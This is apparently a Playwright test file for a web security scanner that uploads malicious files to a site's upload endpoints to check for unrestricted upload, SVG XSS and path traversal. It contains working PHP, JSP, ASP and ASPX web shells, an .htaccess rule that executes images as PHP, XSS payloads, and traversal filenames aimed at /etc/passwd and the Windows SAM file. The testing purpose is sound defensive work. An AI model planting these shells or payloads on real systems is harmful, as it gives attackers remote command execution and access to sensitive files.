import { test, expect } from '@playwright/test';
import { DASTReporter } from '../utils/helpers';

const reporter = new DASTReporter();

// Malicious file content for testing
const maliciousFiles = [
  {
    name: 'shell.php',
    content: '<?php system($_GET["cmd"]); ?>',
    type: 'application/x-php',
    risk: 'critical',
  },
  {
    name: 'shell.jsp',
    content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
    type: 'application/x-jsp',
    risk: 'critical',
  },
  {
    name: 'shell.asp',
    content: '<% eval request("cmd") %>',
    type: 'application/x-asp',
    risk: 'critical',
  },
  {
    name: 'shell.aspx',
    content: '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start(Request["cmd"]); %>',
    type: 'application/x-aspx',
    risk: 'critical',
  },
  {
    name: 'malicious.html',
    content: '<script>alert("XSS")</script>',
    type: 'text/html',
    risk: 'high',
  },
  {
    name: 'malicious.svg',
    content: '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
    type: 'image/svg+xml',
    risk: 'high',
  },
  {
    name: 'malicious.pdf',
    content: '%PDF-1.4\n1 0 obj\n<<\n/Type /Catalog\n/Pages 2 0 R\n/OpenAction 3 0 R\n>>\nendobj\n2 0 obj\n<<\n/Type /Pages\n/Kids []\n/Count 0\n>>\nendobj\n3 0 obj\n<<\n/S /JavaScript\n/JS (app.alert\("XSS"\))\n>>\nendobj\nxref\n0 4\n0000000000 65535 f\n0000000009 00000 n\n0000000058 00000 n\n0000000115 00000 n\ntrailer\n<<\n/Size 4\n/Root 1 0 R\n>>\nstartxref\n190\n%%EOF',
    type: 'application/pdf',
    risk: 'medium',
  },
  {
    name: 'double_extension.php.jpg',
    content: '<?php system($_GET["cmd"]); ?>',
    type: 'image/jpeg',
    risk: 'high',
  },
  {
    name: 'null_byte.php%00.jpg',
    content: '<?php echo "shell"; ?>',
    type: 'image/jpeg',
    risk: 'high',
  },
  {
    name: '.htaccess',
    content: 'AddType application/x-httpd-php .jpg\nphp_flag engine on',
    type: 'text/plain',
    risk: 'critical',
  },
];

const uploadEndpoints = ['/upload', '/api/upload', '/api/files', '/files/upload', '/attachments'];

test.describe('File Upload Vulnerability Tests', () => {
  test('Check for unrestricted file upload', async ({ page, request }) => {
    // First, try to find upload forms
    await page.goto('/');
    
    const forms = await page.$$('form');
    const uploadForms: { action: string; enctype: string; method: string }[] = [];
    
    for (const form of forms) {
      const enctype = await form.getAttribute('enctype');
      if (enctype === 'multipart/form-data') {
        const action = await form.getAttribute('action') || '';
        const method = await form.getAttribute('method') || 'post';
        uploadForms.push({ action, enctype, method });
      }
    }
    
    // Also test common API endpoints
    const allEndpoints = [...uploadForms.map(f => f.action || '/upload'), ...uploadEndpoints];
    const uniqueEndpoints = [...new Set(allEndpoints)];
    
    for (const endpoint of uniqueEndpoints) {
      for (const file of maliciousFiles) {
        try {
          const boundary = '----WebKitFormBoundary' + Math.random().toString(36).substring(2);
          const body = [
            `------${boundary}`,
            `Content-Disposition: form-data; name="file"; filename="${file.name}"`,
            `Content-Type: ${file.type}`,
            ``,
            file.content,
            `------${boundary}--`,
          ].join('\r\n');
          
          const response = await request.post(endpoint, {
            data: body,
            headers: {
              'Content-Type': `multipart/form-data; boundary=----${boundary}`,
            },
            timeout: 15000,
          });
          
          const responseBody = await response.text();
          
          // Check for successful upload indicators
          const successIndicators = [
            'upload successful',
            'file uploaded',
            'success',
            '200',
            'location',
            file.name.toLowerCase(),
          ];
          
          const isSuccess = successIndicators.some(indicator => 
            responseBody.toLowerCase().includes(indicator) || 
            response.status() === 201 ||
            response.status() === 200
          );
          
          // Check if we can access the uploaded file
          const fileUrlPatterns = [
            `/uploads/${file.name}`,
            `/files/${file.name}`,
            `/attachments/${file.name}`,
            `/storage/${file.name}`,
          ];
          
          for (const fileUrl of fileUrlUrls(responseBody, file.name)) {
            try {
              const fileResponse = await request.get(fileUrl, { timeout: 5000 });
              if (fileResponse.status() === 200) {
                const fileContent = await fileResponse.text();
                
                // Check if the file is executable
                if (fileContent.includes(file.content.substring(0, 30))) {
                  reporter.addFinding({
                    severity: file.risk as 'critical' | 'high' | 'medium',
                    title: 'Unrestricted File Upload',
                    description: `Server accepts and stores executable file "${file.name}"`,
                    url: endpoint,
                    evidence: `File accessible at: ${fileUrl}`,
                    cwe: 'CWE-434',
                    owasp: 'A01:2021 - Broken Access Control',
                    recommendation: 'Validate file extensions, MIME types, and content. Store uploads outside web root.',
                  });
                }
              }
            } catch (e) {
              // Continue
            }
          }
          
          // Report if upload was accepted regardless
          if (isSuccess && (file.risk === 'critical' || file.risk === 'high')) {
            reporter.addFinding({
              severity: 'high',
              title: 'Potential Unrestricted File Upload',
              description: `Server accepted potentially dangerous file "${file.name}"`,
              url: endpoint,
              evidence: `Response status: ${response.status()}`,
              cwe: 'CWE-434',
              owasp: 'A01:2021 - Broken Access Control',
              recommendation: 'Implement strict file type validation and content inspection',
            });
          }
        } catch (e) {
          // Continue
        }
      }
    }
  });

  test('Check for SVG XSS upload', async ({ page, request }) => {
    const svgXssPayloads = [
      '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
      '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
      '<svg xmlns="http://www.w3.org/2000/svg"><image href="x" onerror="alert(1)"/></svg>',
      '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>',
    ];
    
    for (const endpoint of uploadEndpoints) {
      for (const payload of svgXssPayloads) {
        try {
          const boundary = '----WebKitFormBoundary' + Math.random().toString(36).substring(2);
          const body = [
            `------${boundary}`,
            `Content-Disposition: form-data; name="file"; filename="xss.svg"`,
            `Content-Type: image/svg+xml`,
            ``,
            payload,
            `------${boundary}--`,
          ].join('\r\n');
          
          const response = await request.post(endpoint, {
            data: body,
            headers: {
              'Content-Type': `multipart/form-data; boundary=----${boundary}`,
            },
            timeout: 10000,
          });
          
          if (response.status() === 200 || response.status() === 201) {
            reporter.addFinding({
              severity: 'high',
              title: 'SVG XSS Upload',
              description: `Server accepts SVG files with embedded JavaScript at "${endpoint}"`,
              url: endpoint,
              payload,
              cwe: 'CWE-79',
              owasp: 'A03:2021 - Injection',
              recommendation: 'Sanitize SVG files or serve them with Content-Disposition: attachment',
            });
          }
        } catch (e) {
          // Continue
        }
      }
    }
  });

  test('Check for path traversal in filename', async ({ request }) => {
    const pathTraversalFilenames = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '../../../var/www/html/config.php',
      '....//....//....//etc/passwd',
    ];
    
    for (const endpoint of uploadEndpoints) {
      for (const filename of pathTraversalFilenames) {
        try {
          const boundary = '----WebKitFormBoundary' + Math.random().toString(36).substring(2);
          const body = [
            `------${boundary}`,
            `Content-Disposition: form-data; name="file"; filename="${filename}"`,
            `Content-Type: text/plain`,
            ``,
            'test content',
            `------${boundary}--`,
          ].join('\r\n');
          
          const response = await request.post(endpoint, {
            data: body,
            headers: {
              'Content-Type': `multipart/form-data; boundary=----${boundary}`,
            },
            timeout: 10000,
          });
          
          const responseBody = await response.text();
          
          // Check for file system errors that might indicate path traversal worked
          const traversalIndicators = [
            'permission denied',
            'file exists',
            'already exists',
            'overwrite',
            filename.split('/').pop(),
          ];
          
          for (const indicator of traversalIndicators) {
            if (responseBody.toLowerCase().includes(indicator.toLowerCase())) {
              reporter.addFinding({
                severity: 'critical',
                title: 'Path Traversal in File Upload',
                description: `Filename path traversal may be possible at "${endpoint}"`,
                url: endpoint,
                evidence: `Filename: ${filename}`,
                cwe: 'CWE-22',
                owasp: 'A01:2021 - Broken Access Control',
                recommendation: 'Sanitize filenames and validate upload paths',
              });
              break;
            }
          }
        } catch (e) {
          // Continue
        }
      }
    }
  });
});

// Helper function to extract potential file URLs from response
function fileUrlUrls(responseBody: string, filename: string): string[] {
  const urls: string[] = [];
  const patterns = [
    /["'](\/[^"']*uploads?\/[^"']*)["']/gi,
    /["'](\/[^"']*files?\/[^"']*)["']/gi,
    /["'](\/[^"']*attachments?\/[^"']*)["']/gi,
    /["'](\/[^"']*storage\/[^"']*)["']/gi,
    /["'](\/[^"']*media\/[^"']*)["']/gi,
    /["'](\/[^"']*assets\/[^"']*)["']/gi,
  ];
  
  for (const pattern of patterns) {
    let match;
    while ((match = pattern.exec(responseBody)) !== null) {
      urls.push(match[1]);
    }
  }
  
  // Also add common patterns with filename
  urls.push(`/uploads/${filename}`);
  urls.push(`/files/${filename}`);
  urls.push(`/attachments/${filename}`);
  
  return [...new Set(urls)];
}
